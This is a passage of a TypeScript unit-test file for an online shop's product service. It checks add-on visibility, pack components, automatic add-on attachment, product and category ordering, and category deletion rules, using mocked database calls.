      product: { findMany: vi.fn(async () => [addOnHydratedProduct()]) },
    });

    const page = await harness.service.listPublicAddOns({ locale: "es", limit: 12 }, "es");
    const [item] = page.items;

    expect(item?.slug).toBe("shaker");
    // `onHand`, `reserved` and `lowStockThreshold` are stock intelligence and
    // are absent from the public inventory record.
    expect(item?.variants[0]?.inventory).not.toHaveProperty("onHand");
  });
});

describe("ProductsService.getBySlugPublic — add-ons stay reachable", () => {
  /**
   * UNLISTED IS NOT HIDDEN. The whole point of an add-on is that a product page
   * links to it; 404ing the destination would make the feature unusable, and
   * `getBySlugPublic` therefore filters on status and never on `listed`.
   */
  it("serves an add-on by slug", async () => {
    const harness = await buildHarness({
      product: { findFirst: vi.fn(async () => addOnHydratedProduct()) },
    });

    const product = await harness.service.getBySlugPublic("shaker");

    expect(product.slug).toBe("shaker");
    expect(product.listed).toBe(false);
  });

  it("reads the row without consulting the listed column at all", async () => {
    // Same reason as `spyQueryRaw`: the generic types the recorded argument as
    // `unknown` without declaring a parameter nothing reads.
    const findFirst = vi.fn<(args: unknown) => Promise<ReturnType<typeof addOnHydratedProduct>>>(
      async () => addOnHydratedProduct(),
    );
    const harness = await buildHarness({ product: { findFirst } });

    await harness.service.getBySlugPublic("shaker");

    const args = z
      .object({ where: z.record(z.unknown()) })
      .parse(findFirst.mock.calls[0]?.[0]);

    expect(Object.keys(args.where)).not.toContain("listed");
  });
});

describe("ProductsService.listPackComponentsFor", () => {
  const COMPONENT_A = "10000000-0000-4000-8000-000000000001";
  const COMPONENT_B = "10000000-0000-4000-8000-000000000002";
  const COMPONENT_C = "10000000-0000-4000-8000-000000000003";
  const VARIANT_A = "20000000-0000-4000-8000-000000000001";
  const VARIANT_B = "20000000-0000-4000-8000-000000000002";
  const VARIANT_C = "20000000-0000-4000-8000-000000000003";
  const PACK_VARIANT_ID = "20000000-0000-4000-8000-000000000099";

  /** A PACK product whose page names three real components, in order. */
  function packHost() {
    return {
      ...hydratedProduct(),
      slug: "pack-recuperacion",
      kind: "PACK" as const,
      status: "ACTIVE" as const,
      // RAW PRISMA EDGE SHAPE, not the mapped `{id, slug, sortOrder,
      // variantId}` output — `getBySlugPublic` runs this through `mapProduct`,
      // which reads `edge.component.{id,slug}` and `edge.componentVariantId`.
      packComponents: [
        { sortOrder: 0, componentVariantId: VARIANT_A, quantity: 1, component: { id: COMPONENT_A, slug: "camiseta" } },
        { sortOrder: 1, componentVariantId: VARIANT_B, quantity: 1, component: { id: COMPONENT_B, slug: "cargo-pants" } },
        { sortOrder: 2, componentVariantId: VARIANT_C, quantity: 1, component: { id: COMPONENT_C, slug: "gorra" } },
      ],
      // The pack's OWN variant — never sold, but `getBySlugPublic` 404s any
      // product with no active variant at all, pack or not.
      variants: [
        {
          id: PACK_VARIANT_ID,
          productId: PRODUCT_ID,
          sku: "AK-PACK",
          name: null,
          options: {},
          currency: "EUR",
          priceNet: 4545,
          priceTax: 954,
          priceGross: 5499,
          compareAtGross: null,
          taxRateBps: 2100,
          priceTiers: [],
          weightGrams: null,
          isActive: true,
          version: 0,
          inventory: null,
          image: null,
          batches: [],
        },
      ],
    };
  }

  /** A resolvable component product row, active with one purchasable variant. */
  function componentRow(id: string, slug: string, variantId: string, overrides: Record<string, unknown> = {}) {
    return {
      ...addOnHydratedProduct(),
      id,
      slug,
      status: "ACTIVE" as const,
      packComponents: [],
      variants: [
        {
          id: variantId,
          productId: id,
          sku: `AK-${slug}`,
          name: null,
          options: {},
          currency: "EUR",
          priceNet: 826,
          priceTax: 173,
          priceGross: 999,
          compareAtGross: null,
          taxRateBps: 2100,
          priceTiers: [],
          weightGrams: 120,
          isActive: true,
          version: 0,
          inventory: null,
          image: null,
          batches: [],
        },
      ],
      ...overrides,
    };
  }

  it("resolves the pack's components, in the admin's chosen order", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => packHost()),
        findMany: vi.fn(async () => [
          componentRow(COMPONENT_A, "camiseta", VARIANT_A),
          componentRow(COMPONENT_B, "cargo-pants", VARIANT_B),
          componentRow(COMPONENT_C, "gorra", VARIANT_C),
        ]),
      },
    });

    const result = await harness.service.listPackComponentsFor("pack-recuperacion");

    expect(result.items.map((item) => item.product.slug)).toEqual([
      "camiseta",
      "cargo-pants",
      "gorra",
    ]);
    // The PINNED variant travels with each component — never left for the
    // storefront to guess via `product.variants`' own cheapest-first default.
    expect(result.items.map((item) => item.variantId)).toEqual([VARIANT_A, VARIANT_B, VARIANT_C]);
    expect(result.items.map((item) => item.quantity)).toEqual([1, 1, 1]);
    expect(result.items.map((item) => item.sortOrder)).toEqual([0, 1, 2]);
  });

  it("returns nothing, and queries nothing, for a product with no pack components", async () => {
    const findMany = vi.fn(async () => []);
    const harness = await buildHarness({
      product: {
        // A SIMPLE product with one active variant and no pack components —
        // `addOnHydratedProduct()` already carries both.
        findFirst: vi.fn(async () => addOnHydratedProduct()),
        findMany,
      },
    });

    const result = await harness.service.listPackComponentsFor("shaker");

    expect(result.items).toEqual([]);
    expect(findMany).not.toHaveBeenCalled();
  });

  it("silently drops a component that has since been soft-deleted or archived", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => packHost()),
        // The findMany's own where clause already excludes deletedAt/status,
        // so a vanished component simply is not among the rows returned —
        // modelled here by omitting it entirely.
        findMany: vi.fn(async () => [
          componentRow(COMPONENT_A, "camiseta", VARIANT_A),
          componentRow(COMPONENT_C, "gorra", VARIANT_C),
        ]),
      },
    });

    const result = await harness.service.listPackComponentsFor("pack-recuperacion");

    expect(result.items.map((item) => item.product.slug)).toEqual(["camiseta", "gorra"]);
  });

  it("drops a component left with no active variant at all", async () => {
    const harness = await buildHarness({
      product: {
        findFirst: vi.fn(async () => packHost()),
        findMany: vi.fn(async () => [
          componentRow(COMPONENT_A, "camiseta", VARIANT_A),
          componentRow(COMPONENT_B, "cargo-pants", VARIANT_B, {
            variants: [],
          }),
          componentRow(COMPONENT_C, "gorra", VARIANT_C),
        ]),
      },
    });

    const result = await harness.service.listPackComponentsFor("pack-recuperacion");

    expect(result.items.map((item) => item.product.slug)).toEqual(["camiseta", "gorra"]);
  });
});

describe("ProductsService.create — add-ons that asked for new products", () => {
  const STICKY_A = "77777777-7777-4777-8777-777777777777";
  const STICKY_B = "88888888-8888-4888-8888-888888888888";
  const STICKY_VARIANT = "99999999-9999-4999-8999-999999999999";

  /** The readback `create` performs after writing. Shape only; nothing asserts on it. */
  function readback() {
    return {
      id: PRODUCT_ID,
      slug: "camiseta",
      status: "DRAFT",
      taxClass: "STANDARD",
      restrictedCountries: [],
      listed: true,
      offerOnNewProducts: false,
      newProductDefaultVariantId: null,
      createdAt: new Date("2026-03-01T00:00:00.000Z"),
      updatedAt: new Date("2026-03-01T00:00:00.000Z"),
      deletedAt: null,
      translations: [],
      media: [],
      categories: [],
      addOns: [],
      packComponents: [],
      kind: "SIMPLE" as const,
      variants: [],
    };
  }

  /**
   * Overriding `product` on the transaction REPLACES the whole model, so
   * `create` and `update` have to be restated alongside `findMany` or the
   * write path loses them.
   */
  async function harnessWithSticky(
    sticky: readonly { id: string; newProductDefaultVariantId: string | null }[],
  ) {
    // TYPED WITH A PARAMETER so `mock.calls[0][0]` is indexable: an untyped
    // `vi.fn(async () => …)` records zero-length tuples and the index is a type
    // error. The query itself is returned so a test can inspect what was ASKED,
    // which is the only way to check a `where` clause against a fake that does
    // not interpret one.
    const stickyQuery = vi.fn<(args: unknown) => Promise<typeof sticky>>(
      async () => sticky,
    );

    const harness = await buildHarness(
      { product: { findUnique: vi.fn(async () => readback()) } },
      {
        product: {
          create: vi.fn(async () => ({ id: PRODUCT_ID, slug: "camiseta" })),
          update: vi.fn(async () => ({ id: PRODUCT_ID })),
          findMany: stickyQuery,
        },
      },
    );

    return { ...harness, stickyQuery };
  }

  it("attaches every add-on that asked, in one write", async () => {
    const harness = await harnessWithSticky([
      { id: STICKY_A, newProductDefaultVariantId: null },
      { id: STICKY_B, newProductDefaultVariantId: STICKY_VARIANT },
    ]);

    await harness.service.create(createInput(), ACTOR_ID);

    expect(harness.recorded.addOnCreateManyData).toEqual([
      { productId: PRODUCT_ID, addOnId: STICKY_A, sortOrder: 0, defaultVariantId: null },
      // Each add-on brings ITS OWN pre-selected variant — the flag and the
      // default travel together, so the automatic edges are not default-less.
      {
        productId: PRODUCT_ID,
        addOnId: STICKY_B,
        sortOrder: 1,
        defaultVariantId: STICKY_VARIANT,
      },
    ]);
  });

  it("writes nothing when no add-on asked", async () => {
    // The overwhelmingly common case, and the one every other test in this file
    // relies on: creating a product must not acquire add-ons by accident.
    const harness = await harnessWithSticky([]);

    await harness.service.create(createInput(), ACTOR_ID);

    expect(harness.recorded.addOnCreateManyData).toEqual([]);
  });

  it("APPENDS after the operator's own choices rather than reordering them", async () => {
    // What they ticked was nested-created with the product a statement earlier,
    // so the automatic edges start at the next sortOrder. A flag set by someone
    // else last month must not reshuffle the arrangement chosen today.
    const harness = await harnessWithSticky([
      { id: STICKY_A, newProductDefaultVariantId: null },
    ]);

    await harness.service.create(
      createInput({ addOns: [{ id: STICKY_B, defaultVariantId: null }] }),
      ACTOR_ID,
    );

    expect(harness.recorded.addOnCreateManyData).toEqual([
      { productId: PRODUCT_ID, addOnId: STICKY_A, sortOrder: 1, defaultVariantId: null },
    ]);
  });

  it("does not attach one the operator already chose", async () => {
    // It is already an edge, nested-created with the product. Writing it again
    // is a duplicate-key error on the composite primary key.
    const harness = await harnessWithSticky([
      { id: STICKY_A, newProductDefaultVariantId: null },
    ]);

    await harness.service.create(
      createInput({ addOns: [{ id: STICKY_A, defaultVariantId: null }] }),
      ACTOR_ID,
    );

    expect(harness.recorded.addOnCreateManyData).toEqual([]);
  });

  it("asks only for flagged, live, OTHER products — the exclusions are in the query", async () => {
    // ASSERTED ON THE QUERY, not on the result. Self-exclusion, the deleted
    // filter and the flag are all `where` clauses, and this fake returns
    // whatever array it was given without interpreting one — so a test that
    // fed it the product itself and then checked the rows would only be
    // proving the stub is naive. What IS observable, and what actually
    // matters, is the query the service issues.
    const harness = await harnessWithSticky([]);

    await harness.service.create(createInput(), ACTOR_ID);

    expect(harness.stickyQuery).toHaveBeenCalledTimes(1);
    expect(harness.stickyQuery.mock.calls[0]?.[0]).toMatchObject({
      where: { offerOnNewProducts: true, deletedAt: null, id: { not: PRODUCT_ID } },
    });
  });
});

describe("ProductsService.offerEverywhere", () => {
  const ADD_ON = "11111111-1111-4111-8111-111111111111";
  const HOST_A = "33333333-3333-4333-8333-333333333333";
  const HOST_B = "44444444-4444-4444-8444-444444444444";
  const ADD_ON_VARIANT = "55555555-5555-4555-8555-555555555555";

  /**
   * `buildTx` spreads its overrides at the TOP level, so supplying `product`
   * replaces that model wholesale — which is fine here, because this path only
   * ever reads hosts. `productVariant.findMany` lives on the PRISMA side, not
   * the transaction: the ownership check runs before the write opens.
   */
  function harnessWithHosts(
    hosts: readonly { id: string; addOns: { addOnId: string; sortOrder: number }[] }[],
    variantRows: readonly { id: string; productId: string }[] = [],
  ) {
    return buildHarness(
      {
        product: { findFirst: vi.fn(async () => ({ id: ADD_ON })) },
        productVariant: { findMany: vi.fn(async () => variantRows) },
      },
      { product: { findMany: vi.fn(async () => hosts) } },
    );
  }

  it("appends to every host that does not already offer it", async () => {
    // APPENDS. Each host keeps what it had, and the new edge takes the next
    // sortOrder — replacing their lists would silently drop a colleague's work.
    const harness = await harnessWithHosts([
      { id: HOST_A, addOns: [] },
      { id: HOST_B, addOns: [{ addOnId: "other", sortOrder: 0 }] },
    ]);

    const result = await harness.service.offerEverywhere(ADD_ON, { defaultVariantId: null });

    expect(result).toEqual({ attached: 2, alreadyPresent: 0, skippedAtCap: 0 });
    expect(harness.recorded.addOnCreateManyData).toEqual([
      { productId: HOST_A, addOnId: ADD_ON, sortOrder: 0, defaultVariantId: null },
      // After the one it already had, not over it.
      { productId: HOST_B, addOnId: ADD_ON, sortOrder: 1, defaultVariantId: null },
    ]);
    // NEVER a delete: this is not the replacement route.
    expect(harness.recorded.addOnDeleteWheres).toEqual([]);
  });

  it("is idempotent — a second run attaches nothing", async () => {
    const harness = await harnessWithHosts([
      { id: HOST_A, addOns: [{ addOnId: ADD_ON, sortOrder: 0 }] },
      { id: HOST_B, addOns: [{ addOnId: ADD_ON, sortOrder: 3 }] },
    ]);

    const result = await harness.service.offerEverywhere(ADD_ON, { defaultVariantId: null });

    expect(result).toEqual({ attached: 0, alreadyPresent: 2, skippedAtCap: 0 });
    expect(harness.recorded.addOnCreateManyData).toEqual([]);
  });

  it("skips a host already at the cap rather than pushing it over", async () => {
    // `setAddOnsSchema` refuses a 21st add-on, so writing one here would put a
    // host into a state its own edit form could never save.
    const full = Array.from({ length: 20 }, (_, index) => ({
      addOnId: `other-${index}`,
      sortOrder: index,
    }));
    const harness = await harnessWithHosts([
      { id: HOST_A, addOns: full },
      { id: HOST_B, addOns: [] },
    ]);

    const result = await harness.service.offerEverywhere(ADD_ON, { defaultVariantId: null });

    expect(result).toEqual({ attached: 1, alreadyPresent: 0, skippedAtCap: 1 });
    expect(harness.recorded.addOnCreateManyData).toEqual([
      { productId: HOST_B, addOnId: ADD_ON, sortOrder: 0, defaultVariantId: null },
    ]);
  });

  it("writes the pre-selected variant onto every edge it creates", async () => {
    const harness = await harnessWithHosts(
      [{ id: HOST_A, addOns: [] }],
      [{ id: ADD_ON_VARIANT, productId: ADD_ON }],
    );

    await harness.service.offerEverywhere(ADD_ON, { defaultVariantId: ADD_ON_VARIANT });

    expect(harness.recorded.addOnCreateManyData).toEqual([
      { productId: HOST_A, addOnId: ADD_ON, sortOrder: 0, defaultVariantId: ADD_ON_VARIANT },
    ]);
  });

  it("refuses a default variant that belongs to a DIFFERENT product", async () => {
    // The composite foreign key would reject it too, as a constraint violation
    // mapped to a conflict. Named here, it is a 400 that says what is wrong.
    const harness = await harnessWithHosts(
      [{ id: HOST_A, addOns: [] }],
      [{ id: ADD_ON_VARIANT, productId: "someone-else" }],
    );

    await expect(
      harness.service.offerEverywhere(ADD_ON, { defaultVariantId: ADD_ON_VARIANT }),
    ).rejects.toBeInstanceOf(CatalogError);
    expect(harness.recorded.addOnCreateManyData).toEqual([]);
  });

  it("revalidates only when something actually changed", async () => {
    // Every host page now offers something new — but a run that attached
    // nothing has invalidated nothing, and enqueueing anyway would wake the
    // whole catalogue for a no-op.
    const quiet = await harnessWithHosts([
      { id: HOST_A, addOns: [{ addOnId: ADD_ON, sortOrder: 0 }] },
    ]);
    await quiet.service.offerEverywhere(ADD_ON, { defaultVariantId: null });
    expect(quiet.recorded.outbox).toEqual([]);

    const busy = await harnessWithHosts([{ id: HOST_A, addOns: [] }]);
    await busy.service.offerEverywhere(ADD_ON, { defaultVariantId: null });
    expect(busy.recorded.outbox.length).toBeGreaterThan(0);
  });
});

describe("ProductsService.setAddOns", () => {
  const ADD_ON_A = "11111111-1111-4111-8111-111111111111";
  const ADD_ON_B = "22222222-2222-4222-8222-222222222222";

  function hydrated() {
    return {
      id: PRODUCT_ID,
      slug: "camiseta",
      status: "ACTIVE",
      taxClass: "STANDARD",
      restrictedCountries: [],
      listed: true,
      createdAt: new Date("2026-03-01T00:00:00.000Z"),
      updatedAt: new Date("2026-03-01T00:00:00.000Z"),
      deletedAt: null,
      translations: [],
      media: [],
      categories: [],
      addOns: [],
      packComponents: [],
      kind: "SIMPLE" as const,
      variants: [],
    };
  }

  async function harnessWith(liveIds: readonly string[]) {
    return buildHarness({
      product: {
        findFirst: vi.fn(async () => ({ id: PRODUCT_ID })),
        findMany: vi.fn(async () => liveIds.map((id) => ({ id }))),
        findUnique: vi.fn(async () => hydrated()),
      },
    });
  }

  it("replaces the whole list, and the array's position IS the sort order", async () => {
    // Full replacement rather than a patch, because ordering is part of the
    // value being set — the same shape `replaceCategories` uses.
    const harness = await harnessWith([ADD_ON_A, ADD_ON_B]);

    await harness.service.setAddOns(PRODUCT_ID, { addOnIds: [ADD_ON_B, ADD_ON_A] });

    expect(harness.recorded.addOnDeleteWheres).toEqual([{ productId: PRODUCT_ID }]);
    expect(harness.recorded.addOnCreateManyData).toEqual([
      // `defaultVariantId` rides along on every edge now. Null here because
      // this call names no default — the shape is asserted in full so a field
      // silently going missing fails rather than passing a partial match.
      { productId: PRODUCT_ID, addOnId: ADD_ON_B, sortOrder: 0, defaultVariantId: null },
      { productId: PRODUCT_ID, addOnId: ADD_ON_A, sortOrder: 1, defaultVariantId: null },
    ]);
  });

  it("refuses to let a product offer itself", async () => {
    // Named here rather than left to the table's CHECK, so the operator reads a
    // sentence instead of a constraint violation.
    const harness = await harnessWith([PRODUCT_ID]);

    await expect(
      harness.service.setAddOns(PRODUCT_ID, { addOnIds: [PRODUCT_ID] }),
    ).rejects.toBeInstanceOf(CatalogError);
    expect(harness.recorded.addOnCreateManyData).toEqual([]);
  });

  it("refuses an id that names no live product, rather than a foreign-key error", async () => {
    // Only ADD_ON_A comes back live, so ADD_ON_B does not exist.
    const harness = await harnessWith([ADD_ON_A]);

    await expect(
      harness.service.setAddOns(PRODUCT_ID, { addOnIds: [ADD_ON_A, ADD_ON_B] }),
    ).rejects.toBeInstanceOf(CatalogError);
    expect(harness.recorded.addOnCreateManyData).toEqual([]);
  });

  it("never touches `listed` on the product or on what it attaches", async () => {
    // THE ORTHOGONALITY INVARIANT. Attaching a product as an add-on says "this
    // page offers it", never "hide it from the grid". A write that unlisted a
    // product on the operator's behalf would be a merchandising decision nobody
    // made, and this is the assertion that stops one creeping in.
    const harness = await harnessWith([ADD_ON_A]);

    await harness.service.setAddOns(PRODUCT_ID, { addOnIds: [ADD_ON_A] });

    for (const update of harness.recorded.productUpdates) {
      expect(update).not.toHaveProperty("listed");
    }
  });

  it("clears the list when given none", async () => {
    const harness = await harnessWith([]);

    await harness.service.setAddOns(PRODUCT_ID, { addOnIds: [] });

    expect(harness.recorded.addOnDeleteWheres).toEqual([{ productId: PRODUCT_ID }]);
    expect(harness.recorded.addOnCreateManyData).toEqual([]);
  });
});

describe("ProductsService.reorder", () => {
  const PRODUCT_A = "11111111-1111-4111-8111-111111111111";
  const PRODUCT_B = "22222222-2222-4222-8222-222222222222";
  const PRODUCT_C = "33333333-3333-4333-8333-333333333333";

  async function harnessWith(liveIds: readonly string[]) {
    return buildHarness({
      product: {
        findMany: vi.fn(async () => liveIds.map((id) => ({ id }))),
      },
    });
  }

  it("assigns sortOrder from array position — the array IS the order, same shape setAddOns uses", async () => {
    const harness = await harnessWith([PRODUCT_A, PRODUCT_B, PRODUCT_C]);

    const result = await harness.service.reorder({
      productIds: [PRODUCT_C, PRODUCT_A, PRODUCT_B],
    });

    expect(harness.recorded.productUpdateWheres).toEqual([
      { id: PRODUCT_C },
      { id: PRODUCT_A },
      { id: PRODUCT_B },
    ]);
    expect(harness.recorded.productUpdates).toEqual([
      { sortOrder: 0 },
      { sortOrder: 1 },
      { sortOrder: 2 },
    ]);
    expect(result).toEqual({ reordered: 3 });
  });

  it("silently drops an id that no longer names a live product, rather than rejecting the whole batch", async () => {
    // Only A and B are still live — C was soft-deleted by someone else between
    // the reorder screen loading and this save landing.
    const harness = await harnessWith([PRODUCT_A, PRODUCT_B]);

    const result = await harness.service.reorder({
      productIds: [PRODUCT_C, PRODUCT_A, PRODUCT_B],
    });

    // C is gone from the sequence entirely — A and B still get 0 and 1, not
    // 1 and 2, so there is no gap a later insertion could land inside by luck.
    expect(harness.recorded.productUpdateWheres).toEqual([{ id: PRODUCT_A }, { id: PRODUCT_B }]);
    expect(harness.recorded.productUpdates).toEqual([{ sortOrder: 0 }, { sortOrder: 1 }]);
    expect(result).toEqual({ reordered: 2 });
  });

  it("emits one catalogue-wide purge, not one per product", async () => {
    const harness = await harnessWith([PRODUCT_A, PRODUCT_B]);

    await harness.service.reorder({ productIds: [PRODUCT_A, PRODUCT_B] });

    const purges = harness.recorded.outbox.filter(
      (message) => message.topic === REVALIDATION_TOPIC,
    );
    expect(purges).toHaveLength(1);
    expect(purges[0]?.payload["reason"]).toBe(CATALOG_TOPICS.productUpdated);
  });

  it("does nothing when every id in the request is already gone", async () => {
    const harness = await harnessWith([]);

    const result = await harness.service.reorder({ productIds: [PRODUCT_A] });

    expect(harness.recorded.productUpdates).toEqual([]);
    expect(result).toEqual({ reordered: 0 });
  });
});

describe("ProductsService.createCategory", () => {
  it("appends to the end of the manual order — one past the current max", async () => {
    const harness = await buildHarness(
      {},
      { category: { aggregate: vi.fn(async () => ({ _max: { sortOrder: 3 } })) } },
    );

    const created = await harness.service.createCategory({
      slug: "sudaderas",
      name: { es: "Sudaderas", en: "Hoodies" },
    });

    expect(harness.recorded.categoryCreates).toEqual([
      { slug: "sudaderas", name: { es: "Sudaderas", en: "Hoodies" }, sortOrder: 4 },
    ]);
    expect(created.sortOrder).toBe(4);
  });

  it("starts at 0 for the very first category — aggregate over an empty table", async () => {
    const harness = await buildHarness(
      {},
      { category: { aggregate: vi.fn(async () => ({ _max: { sortOrder: null } })) } },
    );

    const created = await harness.service.createCategory({
      slug: "sudaderas",
      name: { es: "Sudaderas", en: "Hoodies" },
    });

    expect(created.sortOrder).toBe(0);
  });

  it("purges the storefront's category navigation on create", async () => {
    const harness = await buildHarness();

    await harness.service.createCategory({
      slug: "sudaderas",
      name: { es: "Sudaderas", en: "Hoodies" },
    });

    const purges = harness.recorded.outbox.filter(
      (message) => message.topic === REVALIDATION_TOPIC,
    );
    expect(purges).toHaveLength(1);
    expect(purges[0]?.payload["reason"]).toBe(CATALOG_TOPICS.categoryCreated);
  });

  it("surfaces a duplicate slug as CONFLICT, not a raw constraint error", async () => {
    const harness = await buildHarness(
      {},
      {
        category: {
          aggregate: vi.fn(async () => ({ _max: { sortOrder: 0 } })),
          create: vi.fn(async () => {
            throw new Prisma.PrismaClientKnownRequestError("Unique constraint failed", {
              code: "P2002",
              clientVersion: "6.0.0",
              meta: { target: ["slug"] },
            });
          }),
        },
      },
    );

    await expect(
      harness.service.createCategory({ slug: "sudaderas", name: { es: "Sudaderas", en: "Hoodies" } }),
    ).rejects.toMatchObject({ code: "CONFLICT" });
  });
});

describe("ProductsService.updateCategory", () => {
  it("renames — slug and sortOrder are untouched by this write", async () => {
    const harness = await buildHarness();

    const updated = await harness.service.updateCategory(CATEGORY_ID, {
      name: { es: "Recuperación", en: "Recovery" },
    });

    expect(harness.recorded.categoryUpdateWheres).toEqual([{ id: CATEGORY_ID }]);
    expect(harness.recorded.categoryUpdates).toEqual([
      { name: { es: "Recuperación", en: "Recovery" } },
    ]);
    expect(updated.name).toEqual({ es: "Recuperación", en: "Recovery" });
  });

  it("refuses to rename a category that does not exist, or is already deleted", async () => {
    const harness = await buildHarness({}, { category: { findFirst: vi.fn(async () => null) } });

    await expect(
      harness.service.updateCategory(CATEGORY_ID, { name: { es: "X", en: "Y" } }),
    ).rejects.toMatchObject({ code: "NOT_FOUND" });
    expect(harness.recorded.categoryUpdates).toEqual([]);
  });

  it("purges the storefront's category navigation on rename", async () => {
    const harness = await buildHarness();

    await harness.service.updateCategory(CATEGORY_ID, { name: { es: "X", en: "Y" } });

    const purges = harness.recorded.outbox.filter(
      (message) => message.topic === REVALIDATION_TOPIC,
    );
    expect(purges).toHaveLength(1);
    expect(purges[0]?.payload["reason"]).toBe(CATALOG_TOPICS.categoryUpdated);
  });
});

describe("ProductsService.reorderCategories", () => {
  const CATEGORY_A = "11111111-1111-4111-8111-111111111111";
  const CATEGORY_B = "22222222-2222-4222-8222-222222222222";
  const CATEGORY_C = "33333333-3333-4333-8333-333333333333";

  async function harnessWith(liveIds: readonly string[]) {
    return buildHarness({
      category: {
        findMany: vi.fn(async () => liveIds.map((id) => ({ id }))),
      },
    });
  }

  it("assigns sortOrder from array position, the same shape ProductsService.reorder uses", async () => {
    const harness = await harnessWith([CATEGORY_A, CATEGORY_B, CATEGORY_C]);

    const result = await harness.service.reorderCategories({
      categoryIds: [CATEGORY_C, CATEGORY_A, CATEGORY_B],
    });

    expect(harness.recorded.categoryUpdateWheres).toEqual([
      { id: CATEGORY_C },
      { id: CATEGORY_A },
      { id: CATEGORY_B },
    ]);
    expect(harness.recorded.categoryUpdates).toEqual([
      { sortOrder: 0 },
      { sortOrder: 1 },
      { sortOrder: 2 },
    ]);
    expect(result).toEqual({ reordered: 3 });
  });

  it("silently drops an id that no longer names a live category", async () => {
    const harness = await harnessWith([CATEGORY_A, CATEGORY_B]);

    const result = await harness.service.reorderCategories({
      categoryIds: [CATEGORY_C, CATEGORY_A, CATEGORY_B],
    });

    expect(harness.recorded.categoryUpdateWheres).toEqual([{ id: CATEGORY_A }, { id: CATEGORY_B }]);
    expect(result).toEqual({ reordered: 2 });
  });

  it("does nothing, and purges nothing, when every id in the request is already gone", async () => {
    const harness = await harnessWith([]);

    const result = await harness.service.reorderCategories({ categoryIds: [CATEGORY_A] });

    expect(harness.recorded.categoryUpdates).toEqual([]);
    expect(harness.recorded.outbox).toEqual([]);
    expect(result).toEqual({ reordered: 0 });
  });
});

describe("ProductsService.removeCategory", () => {
  it("soft-deletes a category no product carries", async () => {
    const harness = await buildHarness(
      {},
      { productCategory: { count: vi.fn(async () => 0) } },
    );

    await harness.service.removeCategory(CATEGORY_ID);

    expect(harness.recorded.categoryUpdateWheres).toEqual([{ id: CATEGORY_ID }]);
    const [update] = harness.recorded.categoryUpdates;
    expect(update?.["deletedAt"]).toBeInstanceOf(Date);
  });

  it("refuses while a LIVE product still carries it", async () => {
    const harness = await buildHarness(
      {},
      { productCategory: { count: vi.fn(async () => 2) } },
    );

    await expect(harness.service.removeCategory(CATEGORY_ID)).rejects.toMatchObject({
      code: "CONFLICT",
    });
    expect(harness.recorded.categoryUpdates).toEqual([]);
  });

  /**
   * A category whose only product was soft-deleted shows "0 products" on the
   * operator's own screen (`categories.repository.ts`'s live-only count) yet
   * used to refuse deletion forever, with no recourse — `setCategories` also
   * refuses to touch an archived product, so it could not even be unassigned
   * first. The guard now counts only products still reachable/editable.
   */
  it("allows deletion once the only product that carried it was soft-deleted", async () => {
    const count = vi.fn(async () => 0);
    const harness = await buildHarness({}, { productCategory: { count } });

    await harness.service.removeCategory(CATEGORY_ID);

    expect(count).toHaveBeenCalledWith({
      where: { categoryId: CATEGORY_ID, product: { deletedAt: null } },
    });
    expect(harness.recorded.categoryUpdateWheres).toEqual([{ id: CATEGORY_ID }]);
  });

  it("refuses to delete a category that does not exist, or is already deleted", async () => {
    const harness = await buildHarness({}, { category: { findFirst: vi.fn(async () => null) } });

    await expect(harness.service.removeCategory(CATEGORY_ID)).rejects.toMatchObject({
      code: "NOT_FOUND",
    });
  });

  it("purges the storefront's category navigation on delete", async () => {
    const harness = await buildHarness(
      {},
      { productCategory: { count: vi.fn(async () => 0) } },
    );

    await harness.service.removeCategory(CATEGORY_ID);

    const purges = harness.recorded.outbox.filter(
      (message) => message.topic === REVALIDATION_TOPIC,
    );
    expect(purges).toHaveLength(1);
    expect(purges[0]?.payload["reason"]).toBe(CATALOG_TOPICS.categoryDeleted);
  });
});
